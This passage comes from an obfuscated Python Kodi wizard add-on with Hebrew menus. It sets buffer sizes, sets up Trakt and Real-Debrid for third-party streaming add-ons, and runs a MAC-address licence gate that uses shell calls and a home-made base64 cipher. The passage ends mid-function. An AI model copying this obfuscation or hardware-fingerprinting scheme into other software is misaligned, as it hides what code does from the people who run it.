						if OO0OO00O00OO0O000 .rfind (OOOO00O0OO000OOOO ,1 )>-1 :#line:1713
							OO0OO00O00OO0O000 =OO0OO00O00OO0O000 [1 :OO0OO00O00OO0O000 .rfind (OOOO00O0OO000OOOO )]#line:1714
					else :#line:1715
						if OO0OO00O00OO0O000 .find (" ")>0 :#line:1716
							OO0OO00O00OO0O000 =OO0OO00O00OO0O000 [:OO0OO00O00OO0O000 .find (" ")]#line:1717
						elif OO0OO00O00OO0O000 .find ("/")>0 :#line:1718
							OO0OO00O00OO0O000 =OO0OO00O00OO0O000 [:OO0OO00O00OO0O000 .find ("/")]#line:1719
						elif OO0OO00O00OO0O000 .find (">")>0 :#line:1720
							OO0OO00O00OO0O000 =OO0OO00O00OO0O000 [:OO0OO00O00OO0O000 .find (">")]#line:1721
					OO00OO000OOOOOOOO .append (OO0OO00O00OO0O000 .strip ())#line:1723
			O000O0O00OOOO0O0O =OO00OO000OOOOOOOO #line:1724
		else :#line:1725
			OO00OO000OOOOOOOO =[]#line:1726
			for O0O0O00OOO0O0O0OO in O000O0O00OOOO0O0O :#line:1727
				O0000O0OOO00O000O =u"</"+name #line:1728
				OOO0000OOO000OO0O =O0000OOO0O0OO000O .find (O0O0O00OOO0O0O0OO )#line:1730
				O0OOO000000OO0O00 =O0000OOO0O0OO000O .find (O0000O0OOO00O000O ,OOO0000OOO000OO0O )#line:1731
				OO00O0OOO0OOOOO0O =O0000OOO0O0OO000O .find ("<"+name ,OOO0000OOO000OO0O +1 )#line:1732
				while OO00O0OOO0OOOOO0O <O0OOO000000OO0O00 and OO00O0OOO0OOOOO0O !=-1 :#line:1734
					O0O00OOO0OOO0O00O =O0000OOO0O0OO000O .find (O0000O0OOO00O000O ,O0OOO000000OO0O00 +len (O0000O0OOO00O000O ))#line:1735
					if O0O00OOO0OOO0O00O !=-1 :#line:1736
						O0OOO000000OO0O00 =O0O00OOO0OOO0O00O #line:1737
					OO00O0OOO0OOOOO0O =O0000OOO0O0OO000O .find ("<"+name ,OO00O0OOO0OOOOO0O +1 )#line:1738
				if OOO0000OOO000OO0O ==-1 and O0OOO000000OO0O00 ==-1 :#line:1740
					O000000000OO0O0OO =u""#line:1741
				elif OOO0000OOO000OO0O >-1 and O0OOO000000OO0O00 >-1 :#line:1742
					O000000000OO0O0OO =O0000OOO0O0OO000O [OOO0000OOO000OO0O +len (O0O0O00OOO0O0O0OO ):O0OOO000000OO0O00 ]#line:1743
				elif O0OOO000000OO0O00 >-1 :#line:1744
					O000000000OO0O0OO =O0000OOO0O0OO000O [:O0OOO000000OO0O00 ]#line:1745
				elif OOO0000OOO000OO0O >-1 :#line:1746
					O000000000OO0O0OO =O0000OOO0O0OO000O [OOO0000OOO000OO0O +len (O0O0O00OOO0O0O0OO ):]#line:1747
				if ret :#line:1749
					O0000O0OOO00O000O =O0000OOO0O0OO000O [O0OOO000000OO0O00 :O0000OOO0O0OO000O .find (">",O0000OOO0O0OO000O .find (O0000O0OOO00O000O ))+1 ]#line:1750
					O000000000OO0O0OO =O0O0O00OOO0O0O0OO +O000000000OO0O0OO +O0000O0OOO00O000O #line:1751
				O0000OOO0O0OO000O =O0000OOO0O0OO000O [O0000OOO0O0OO000O .find (O000000000OO0O0OO ,O0000OOO0O0OO000O .find (O0O0O00OOO0O0O0OO ))+len (O000000000OO0O0OO ):]#line:1753
				OO00OO000OOOOOOOO .append (O000000000OO0O0OO )#line:1754
			O000O0O00OOOO0O0O =OO00OO000OOOOOOOO #line:1755
		OOOOO00000O00OOOO +=O000O0O00OOOO0O0O #line:1756
	return OOOOO00000O00OOOO #line:1758
def addItem (O0O00O0000O00OO00 ,O0O00OOO0O0OO0000 ,OOO0OO00O00OOOOOO ,O0O0O0OO00OO0O00O ,O0O00OOOOOOOOOOO0 ,description =None ):#line:1760
	if description ==None :description =''#line:1761
	description ='[COLOR white]'+description +'[/COLOR]'#line:1762
	OO0O0O0O0O000O0O0 =sys .argv [0 ]+"?url="+urllib .quote_plus (O0O00OOO0O0OO0000 )+"&mode="+str (OOO0OO00O00OOOOOO )+"&name="+urllib .quote_plus (O0O00O0000O00OO00 )+"&iconimage="+urllib .quote_plus (O0O0O0OO00OO0O00O )+"&fanart="+urllib .quote_plus (O0O00OOOOOOOOOOO0 )#line:1763
	O0O00OOO0OO0000O0 =True #line:1764
	O0O0000O0O0OO0OO0 =xbmcgui .ListItem (O0O00O0000O00OO00 ,iconImage =O0O0O0OO00OO0O00O ,thumbnailImage =O0O0O0OO00OO0O00O )#line:1765
	O0O0000O0O0OO0OO0 .setInfo (type ="Video",infoLabels ={"Title":O0O00O0000O00OO00 ,"Plot":description })#line:1766
	O0O0000O0O0OO0OO0 .setProperty ("fanart_Image",O0O00OOOOOOOOOOO0 )#line:1767
	O0O0000O0O0OO0OO0 .setProperty ("icon_Image",O0O0O0OO00OO0O00O )#line:1768
	O0O00OOO0OO0000O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0O0O0O0O000O0O0 ,listitem =O0O0000O0O0OO0OO0 ,isFolder =False )#line:1769
	return O0O00OOO0OO0000O0 #line:1770
def get_params ():#line:1772
		O00O00O0O0O0OO0O0 =[]#line:1773
		O00O0OO0OO0O0OO0O =sys .argv [2 ]#line:1774
		if len (O00O0OO0OO0O0OO0O )>=2 :#line:1775
				O0000OOOO0O0000OO =sys .argv [2 ]#line:1776
				OOO000O00000O0O00 =O0000OOOO0O0000OO .replace ('?','')#line:1777
				if (O0000OOOO0O0000OO [len (O0000OOOO0O0000OO )-1 ]=='/'):#line:1778
						O0000OOOO0O0000OO =O0000OOOO0O0000OO [0 :len (O0000OOOO0O0000OO )-2 ]#line:1779
				OO00OO0000OO0000O =OOO000O00000O0O00 .split ('&')#line:1780
				O00O00O0O0O0OO0O0 ={}#line:1781
				for OO000O00OOO0O00OO in range (len (OO00OO0000OO0000O )):#line:1782
						OO0000O00O000OO0O ={}#line:1783
						OO0000O00O000OO0O =OO00OO0000OO0000O [OO000O00OOO0O00OO ].split ('=')#line:1784
						if (len (OO0000O00O000OO0O ))==2 :#line:1785
								O00O00O0O0O0OO0O0 [OO0000O00O000OO0O [0 ]]=OO0000O00O000OO0O [1 ]#line:1786
		return O00O00O0O0O0OO0O0 #line:1788
def decode (O000O0OO0OOO000OO ,OOO000O0O0O00OOO0 ):#line:1793
    import base64 #line:1794
    OOOOOOO0OO0O00000 =[]#line:1795
    if (len (O000O0OO0OOO000OO ))!=4 :#line:1797
     return 10 #line:1798
    OOO000O0O0O00OOO0 =base64 .urlsafe_b64decode (OOO000O0O0O00OOO0 )#line:1799
    for O0OOO0O00O0OO0O0O in range (len (OOO000O0O0O00OOO0 )):#line:1801
        OO0OO00O0OO000O00 =O000O0OO0OOO000OO [O0OOO0O00O0OO0O0O %len (O000O0OO0OOO000OO )]#line:1802
        OO0O0O0O0OOOO00OO =chr ((256 +ord (OOO000O0O0O00OOO0 [O0OOO0O00O0OO0O0O ])-ord (OO0OO00O0OO000O00 ))%256 )#line:1803
        OOOOOOO0OO0O00000 .append (OO0O0O0O0OOOO00OO )#line:1804
    return "".join (OOOOOOO0OO0O00000 )#line:1805
def tmdb_list (O0O00OO0O0O0O00O0 ):#line:1806
    OO0OO0000OO000000 =decode ("7643",O0O00OO0O0O0O00O0 )#line:1809
    return int (OO0OO0000OO000000 )#line:1812
def u_list (O00O0O0O00OO00O0O ):#line:1813
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1815
        from math import sqrt #line:1816
        O00O000000OO0O00O =tmdb_list (TMDB_NEW_API )#line:1817
        OO0OOOOO000OO0OO0 =str ((getHwAddr ('eth0'))*O00O000000OO0O00O )#line:1819
        OOO0O000OO0O00000 =int (OO0OOOOO000OO0OO0 [1 ]+OO0OOOOO000OO0OO0 [2 ]+OO0OOOOO000OO0OO0 [5 ]+OO0OOOOO000OO0OO0 [7 ])#line:1820
        OO000O0000O0OO0OO =(ADDON .getSetting ("pass"))#line:1822
        OO0O0O0OOOO0O00O0 =(str (round (sqrt ((OOO0O000OO0O00000 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1827
        if '.'in OO0O0O0OOOO0O00O0 :#line:1829
         OO0O0O0OOOO0O00O0 =(str (round (sqrt ((OOO0O000OO0O00000 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1830
        if OO000O0000O0OO0OO ==OO0O0O0OOOO0O00O0 :#line:1832
          OOOOO0OOO000O0O00 =O00O0O0O00OO00O0O #line:1834
        else :#line:1836
           if STARTP2 ()and STARTP ()=='ok':#line:1837
             return O00O0O0O00OO00O0O #line:1840
           OOOOO0OOO000O0O00 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1841
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1842
           sys .exit ()#line:1843
        return OOOOO0OOO000O0O00 #line:1844
    else :#line:1845
        STARTP ()#line:1846
def disply_hwr ():#line:1850
   try :#line:1851
    OOOO000OOOOOOOOO0 =tmdb_list (TMDB_NEW_API )#line:1852
    OO0O00000O0OOO0OO =str ((getHwAddr ('eth0'))*OOOO000OOOOOOOOO0 )#line:1853
    O000O0O0000000O0O =(OO0O00000O0OOO0OO [1 ]+OO0O00000O0OOO0OO [2 ]+OO0O00000O0OOO0OO [5 ]+OO0O00000O0OOO0OO [7 ])#line:1860
    O00O00OOOOO00OO00 =(ADDON .getSetting ("action"))#line:1861
    wiz .setS ('action',str (O000O0O0000000O0O ))#line:1863
   except :pass #line:1864
def disply_hwr2 ():#line:1865
   try :#line:1866
    OO0OOOO0O000OOOO0 =tmdb_list (TMDB_NEW_API )#line:1867
    O00O0O00000O0000O =str ((getHwAddr ('eth0'))*OO0OOOO0O000OOOO0 )#line:1869
    O00O0OO00OO0O0000 =(O00O0O00000O0000O [1 ]+O00O0O00000O0000O [2 ]+O00O0O00000O0000O [5 ]+O00O0O00000O0000O [7 ])#line:1878
    OOO0O0OOO00OOOOO0 =(ADDON .getSetting ("action"))#line:1879
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O00O0OO00OO0O0000 )#line:1882
   except :pass #line:1883
def getHwAddr (OO0O000000OOO0OOO ):#line:1885
   import subprocess ,time #line:1886
   OOO0OOOOOOO000O0O ='windows'#line:1887
   if xbmc .getCondVisibility ('system.platform.android'):#line:1888
       OOO0OOOOOOO000O0O ='android'#line:1889
   if xbmc .getCondVisibility ('system.platform.android'):#line:1890
     O000O00O0O000000O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1891
     O0O0O0OO0000OOO0O =re .compile ('link/ether (.+?) brd').findall (str (O000O00O0O000000O ))#line:1893
     O0O000O00000OOO00 =0 #line:1894
     for O0O000OO00OO00O00 in O0O0O0OO0000OOO0O :#line:1895
      if O0O0O0OO0000OOO0O !='00:00:00:00:00:00':#line:1896
          OOOO000O0O00OO0O0 =O0O000OO00OO00O00 #line:1897
          O0O000O00000OOO00 =O0O000O00000OOO00 +int (OOOO000O0O00OO0O0 .replace (':',''),16 )#line:1898
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1900
       O0OO000O0O0OOOO0O =0 #line:1901
       O0O000O00000OOO00 =0 #line:1902
       OOOOO0OOO00O000OO =[]#line:1903
       O0O0OOOO00OO000OO =os .popen ("getmac").read ()#line:1904
       O0O0OOOO00OO000OO =O0O0OOOO00OO000OO .split ("\n")#line:1905
       for O0OO0O00O00O0OOOO in O0O0OOOO00OO000OO :#line:1907
            OOO0O000O000O0O0O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0OO0O00O00O0OOOO ,re .I )#line:1908
            if OOO0O000O000O0O0O :#line:1909
                O0O0O0OO0000OOO0O =OOO0O000O000O0O0O .group ().replace ('-',':')#line:1910
                OOOOO0OOO00O000OO .append (O0O0O0OO0000OOO0O )#line:1911
                O0O000O00000OOO00 =O0O000O00000OOO00 +int (O0O0O0OO0000OOO0O .replace (':',''),16 )#line:1914
   else :#line:1916
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1917
   try :#line:1934
    return O0O000O00000OOO00 #line:1935
   except :pass #line:1936
def getpass ():#line:1937
	disply_hwr2 ()#line:1939
def setpass ():#line:1940
    O0O000OO000OOOO00 =xbmcgui .Dialog ()#line:1941
    OO00O00OOO0OOO0O0 =''#line:1942
    OO000000OO0OOO0OO =xbmc .Keyboard (OO00O00OOO0OOO0O0 ,'הכנס סיסמה')#line:1944
    OO000000OO0OOO0OO .doModal ()#line:1945
    if OO000000OO0OOO0OO .isConfirmed ():#line:1946
           OO000000OO0OOO0OO =OO000000OO0OOO0OO .getText ()#line:1947
    wiz .setS ('pass',str (OO000000OO0OOO0OO ))#line:1948
def setuname ():#line:1949
    O0O000O00O0OO0OO0 =''#line:1950
    OOOOOOOO000000OOO =xbmc .Keyboard (O0O000O00O0OO0OO0 ,'הכנס שם משתמש')#line:1951
    OOOOOOOO000000OOO .doModal ()#line:1952
    if OOOOOOOO000000OOO .isConfirmed ():#line:1953
           O0O000O00O0OO0OO0 =OOOOOOOO000000OOO .getText ()#line:1954
           wiz .setS ('user',str (O0O000O00O0OO0OO0 ))#line:1955
def powerkodi ():#line:1956
    os ._exit (1 )#line:1957
def buffer1 ():#line:1959
	O00000OO0OOO00OOO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1960
	O000OOO00OOOOO000 =xbmc .getInfoLabel ("System.Memory(total)")#line:1961
	O0000OOOOO0O00000 =xbmc .getInfoLabel ("System.FreeMemory")#line:1962
	OO000OO000O00OOO0 =re .sub ('[^0-9]','',O0000OOOOO0O00000 )#line:1963
	OO000OO000O00OOO0 =int (OO000OO000O00OOO0 )/3 #line:1964
	OOOO0O0OO0O0OO00O =OO000OO000O00OOO0 *1024 *1024 #line:1965
	try :O0000OOO000OOOO00 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1966
	except :O0000OOO000OOOO00 =16 #line:1967
	O0OO000OO00OOOO00 =DIALOG .yesno ('FREE MEMORY: '+str (O0000OOOOO0O00000 ),'Based on your free Memory your optimal buffersize is: '+str (OO000OO000O00OOO0 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1970
	if O0OO000OO00OOOO00 ==1 :#line:1971
		with open (O00000OO0OOO00OOO ,"w")as O00OO00000OO0OO00 :#line:1972
			if O0000OOO000OOOO00 >=17 :O0O0O0O000OOOO0OO =xml_data_advSettings_New (str (OOOO0O0OO0O0OO00O ))#line:1973
			else :O0O0O0O000OOOO0OO =xml_data_advSettings_old (str (OOOO0O0OO0O0OO00O ))#line:1974
			O00OO00000OO0OO00 .write (O0O0O0O000OOOO0OO )#line:1976
			DIALOG .ok ('Buffer Size Set to: '+str (OOOO0O0OO0O0OO00O ),'Please restart Kodi for settings to apply.','')#line:1977
	elif O0OO000OO00OOOO00 ==0 :#line:1979
		OOOO0O0OO0O0OO00O =_OO0O0OO0O00OO0OOO (default =str (OOOO0O0OO0O0OO00O ),heading ="INPUT BUFFER SIZE")#line:1980
		with open (O00000OO0OOO00OOO ,"w")as O00OO00000OO0OO00 :#line:1981
			if O0000OOO000OOOO00 >=17 :O0O0O0O000OOOO0OO =xml_data_advSettings_New (str (OOOO0O0OO0O0OO00O ))#line:1982
			else :O0O0O0O000OOOO0OO =xml_data_advSettings_old (str (OOOO0O0OO0O0OO00O ))#line:1983
			O00OO00000OO0OO00 .write (O0O0O0O000OOOO0OO )#line:1984
			DIALOG .ok ('Buffer Size Set to: '+str (OOOO0O0OO0O0OO00O ),'Please restart Kodi for settings to apply.','')#line:1985
def xml_data_advSettings_old (OOO0O0O000O0000OO ):#line:1986
	OOOO000OOO00O0O00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOO0O0O000O0000OO #line:1996
	return OOOO000OOO00O0O00 #line:1997
def xml_data_advSettings_New (OO00OO00O0OOOOO00 ):#line:1999
	OO00O0000OO000OO0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO00OO00O0OOOOO00 #line:2011
	return OO00O0000OO000OO0 #line:2012
def write_ADV_SETTINGS_XML (O0O0O0O0O0O000OOO ):#line:2013
    if not os .path .exists (xml_file ):#line:2014
        with open (xml_file ,"w")as OOO0OO0O00O000O00 :#line:2015
            OOO0OO0O00O000O00 .write (xml_data )#line:2016
def _OO0O0OO0O00OO0OOO (default ="",heading ="",hidden =False ):#line:2017
    ""#line:2018
    OO00O00OOO0OO00OO =xbmc .Keyboard (default ,heading ,hidden )#line:2019
    OO00O00OOO0OO00OO .doModal ()#line:2020
    if (OO00O00OOO0OO00OO .isConfirmed ()):#line:2021
        return unicode (OO00O00OOO0OO00OO .getText (),"utf-8")#line:2022
    return default #line:2023
def index ():#line:2025
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2026
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2027
	if AUTOUPDATE =='Yes':#line:2028
		if wiz .workingURL (WIZARDFILE )==True :#line:2029
			O00OOO0OOO00000OO =wiz .checkWizard ('version')#line:2030
			if O00OOO0OOO00000OO >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O00OOO0OOO00000OO ),'wizardupdate',themeit =THEME2 )#line:2031
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2032
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2033
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2034
	if len (BUILDNAME )>0 :#line:2035
		O0O00OOO0O0OOO0OO =wiz .checkBuild (BUILDNAME ,'version')#line:2036
		O0O000O0OO0OOOO00 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2037
		if O0O00OOO0O0OOO0OO >BUILDVERSION :O0O000O0OO0OOOO00 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O000O0OO0OOOO00 ,O0O00OOO0O0OOO0OO )#line:2038
		addDir (O0O000O0OO0OOOO00 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2040
		try :#line:2042
		     O0OO0OOOOOOOOO0OO =wiz .themeCount (BUILDNAME )#line:2043
		except :#line:2044
		   O0OO0OOOOOOOOO0OO =False #line:2045
		if not O0OO0OOOOOOOOO0OO ==False :#line:2046
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2047
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2048
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2051
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2052
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2053
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2057
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2059
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2061
def morsetup ():#line:2063
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2064
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2065
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2066
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2067
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2068
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2072
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2073
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2076
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2077
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2087
	setView ('files','viewType')#line:2088
def morsetup2 ():#line:2089
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2090
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2096
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2097
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2098
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2099
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2100
def fastupdate ():#line:2101
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2102
def forcefastupdate ():#line:2104
			OO0O000O00O00OOOO ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2105
			wiz .ForceFastUpDate (ADDONTITLE ,OO0O000O00O00OOOO )#line:2106
def rdsetup ():#line:2110
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2111
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2112
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2114
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2115
def traktsetup ():#line:2118
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2121
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2122
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2123
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2124
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2125
	setView ('files','viewType')#line:2126
def setautorealdebrid ():#line:2127
    from resources .libs import real_debrid #line:2128
    OOOOO0O00O00OO00O =real_debrid .RealDebridFirst ()#line:2129
    OOOOO0O00O00OO00O .auth ()#line:2130
def setrealdebrid ():#line:2132
    OO0OO0OOOO0O00O00 =(ADDON .getSetting ("auto_rd"))#line:2133
    if OO0OO0OOOO0O00O00 =='false':#line:2134
       ADDON .openSettings ()#line:2135
    else :#line:2136
        from resources .libs import real_debrid #line:2137
        OOOOOOOO0OOOOOOOO =real_debrid .RealDebrid ()#line:2138
        OOOOOOOO0OOOOOOOO .auth ()#line:2139
        rdon ()#line:2142
def resolveurlsetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2145
def urlresolversetup ():#line:2146
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2147
def placentasetup ():#line:2149
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2150
def reptiliasetup ():#line:2151
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2152
def flixnetsetup ():#line:2153
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2154
def yodasetup ():#line:2155
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2156
def numberssetup ():#line:2157
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2158
def uranussetup ():#line:2159
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2160
def genesissetup ():#line:2161
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2162
def net_tools (view =None ):#line:2164
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2165
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2166
	setView ('files','viewType')#line:2168
def speedMenu ():#line:2169
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2170
def viewIP ():#line:2171
	O0OO0000OO0O00O0O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2185
	O00O00O0O00O000OO =[];OO00OOOOO00OO0OO0 =0 #line:2186
	for O000O0OO0OO0OOOO0 in O0OO0000OO0O00O0O :#line:2187
		O0O00O00OOOOOO0OO =wiz .getInfo (O000O0OO0OO0OOOO0 )#line:2188
		O0OOO0OOOO000OOOO =0 #line:2189
		while O0O00O00OOOOOO0OO =="Busy"and O0OOO0OOOO000OOOO <10 :#line:2190
			O0O00O00OOOOOO0OO =wiz .getInfo (O000O0OO0OO0OOOO0 );O0OOO0OOOO000OOOO +=1 ;wiz .log ("%s sleep %s"%(O000O0OO0OO0OOOO0 ,str (O0OOO0OOOO000OOOO )));xbmc .sleep (1000 )#line:2191
		O00O00O0O00O000OO .append (O0O00O00OOOOOO0OO )#line:2192
		OO00OOOOO00OO0OO0 +=1 #line:2193
	O000O00OOOO000O0O ,OOO00OO0O0O0OO000 ,O0O0OO0OO00000O00 =getIP ()#line:2194
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O00O0O00O000OO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2195
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOO000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2196
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO0O0O0OO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2197
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO0OO00000O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2198
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O00O0O00O000OO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2199
	setView ('files','viewType')#line:2200
def buildMenu ():#line:2202
	if USERNAME =='':#line:2203
		ADDON .openSettings ()#line:2204
		sys .exit ()#line:2205
	if PASSWORD =='':#line:2206
		ADDON .openSettings ()#line:2207
	OOO0O00O00OO00000 =u_list (SPEEDFILE )#line:2208
	(OOO0O00O00OO00000 )#line:2209
	O00O0OOOOO0OO0OO0 =(wiz .workingURL (OOO0O00O00OO00000 ))#line:2210
	(O00O0OOOOO0OO0OO0 )#line:2211
